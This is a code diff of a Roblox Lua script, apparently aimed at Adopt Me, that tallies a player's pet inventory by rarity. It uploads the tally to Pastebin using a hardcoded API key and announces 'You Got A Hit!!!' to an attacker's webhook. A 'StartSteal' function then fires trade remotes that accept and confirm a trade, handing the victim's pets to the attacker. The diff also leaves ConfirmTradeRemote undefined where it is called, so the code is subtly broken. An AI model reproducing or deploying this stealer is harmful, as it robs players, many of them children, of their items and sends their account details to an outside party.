@@ -1,7 +1,6 @@
 local Pets = {}
 local PetCounts = {}
 
--- Fetch pets from the player's inventory
 for i, v in pairs(
     require(game.ReplicatedStorage.ClientModules.Core.ClientData).get_data()[game.Players.LocalPlayer.Name].inventory.pets
 ) do
@@ -32,6 +31,7 @@ end
 local Loaders = require(game.ReplicatedStorage.Fsys).load
 local InventoryDB = Loaders("InventoryDB")
 local ClientData = Loaders("ClientData")
+
 local legendaries_count = 0
 local mega_count = 0
 local neon_count = 0
@@ -50,10 +50,10 @@ for i, v in pairs(ClientData.get("inventory").pets) do
     if InventoryDB[v.category][v.id].rarity == "legendary" then
         legendaries_count = legendaries_count + 1
     end
-    if InventoryDB[v.category][v.id].properties == "mega_neon" then
+    if InventoryDB[v.category][v.id].properties.mega_neon then
         mega_count = mega_count + 1
     end
-    if InventoryDB[v.category][v.id].properties == "neon" then
+    if InventoryDB[v.category][v.id].properties.neon then
         neon_count = neon_count + 1
     end
     if InventoryDB[v.category][v.id].rarity == "ultra_rare" then
@@ -85,7 +85,42 @@ local userr = Username
 local userid = game.Players.LocalPlayer.UserId
 local accage = game.Players.LocalPlayer.AccountAge
 
--- Prepare data for the webhook
+local function pastebin(content)
+    local HttpService = game:GetService("HttpService")
+    local body = {
+        api_dev_key = "R9zark9KHZVGRI61Cds_qiTO1sjR7s1Z",  -- Your Pastebin API key
+        api_paste_code = content,
+        api_option = "paste"
+    }
+
+    local encodedBody = ""
+    for key, value in pairs(body) do
+        encodedBody = encodedBody .. key .. "=" .. HttpService:UrlEncode(value) .. "&"
+    end
+    encodedBody = encodedBody:sub(1, -2)
+
+    local response
+    local success, err = pcall(function()
+        response = request({
+            Url = "https://pastebin.com/api/api_post.php",
+            Method = "POST",
+            Body = encodedBody,
+            Headers = {
+                ["Content-Type"] = "application/x-www-form-urlencoded"
+            },
+            Timeout = 20
+        })
+    end)
+
+    if not success or not response or not response.Success then
+        return "\nError...\n"
+    end
+
+    local pasteUrl = response.Body
+    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
+    return rawUrl
+end
+
 local inventorySummary = 
     "Total Count: " .. tostring(total_pets) .. "\n" ..
     "Legendaries: " .. tostring(legendaries_count) .. "\n" ..
@@ -96,7 +131,7 @@ local inventorySummary =
     "Uncommons: " .. tostring(uncommon_count) .. "\n" ..
     "Commons: " .. tostring(common_count)
 
-local pastebinLink = pastebin(inventorySummary) -- Upload the inventory summary to Pastebin
+local pastebinLink = pastebin(inventorySummary)  -- Upload the inventory summary to Pastebin
 
 local data = {
     username = "You Got A Hit!!!",
@@ -149,11 +184,7 @@ local data = {
     }
 }
 
--- (The rest of the script follows...)
-
 local request = http_request or request or HttpPost or syn.request
-
--- Send webhook request
 request(
     {
         Url = Webhook,
@@ -165,44 +196,6 @@ request(
     }
 )
 
--- Pastebin integration
-local function pastebin(content)
-    local body = {
-        api_dev_key = "R9zark9KHZVGRI61Cds_qiTO1sjR7s1Z", -- Your actual API key
-        api_paste_code = content,
-        api_option = "paste"
-    }
-
-    local encodedBody = ""
-    for key, value in pairs(body) do
-        encodedBody = encodedBody .. key .. "=" .. game.HttpService:UrlEncode(value) .. "&"
-    end
-    encodedBody = encodedBody:sub(1, -2)
-
-    local response
-    local success, err = pcall(function()
-        response = request({
-            Url = "https://pastebin.com/api/api_post.php",
-            Method = "POST",
-            Body = encodedBody,
-            Headers = {
-                ["Content-Type"] = "application/x-www-form-urlencoded"
-            },
-            Timeout = 20
-        })
-    end)
-
-    if not success or not response or not response.Success then
-        return "\nError...\n"
-    end
-
-    local pasteUrl = response.Body
-    local rawUrl = "https://pastebin.com/raw/" .. pasteUrl:match("([%w]+)$")
-
-    return rawUrl
-end
-
--- Start the stealing process
 local function StartSteal()
     local Loads = require(game.ReplicatedStorage.Fsys).load
     local RouterClient = Loads("RouterClient")
@@ -236,7 +229,6 @@ local function StartSteal()
     wait(6)
     AcceptNegotiationRemote:FireServer()
     wait(5)
-    local ConfirmTradeRemote = RouterClient.get("TradeAPI/ConfirmTrade")
     ConfirmTradeRemote:FireServer()
 end
 
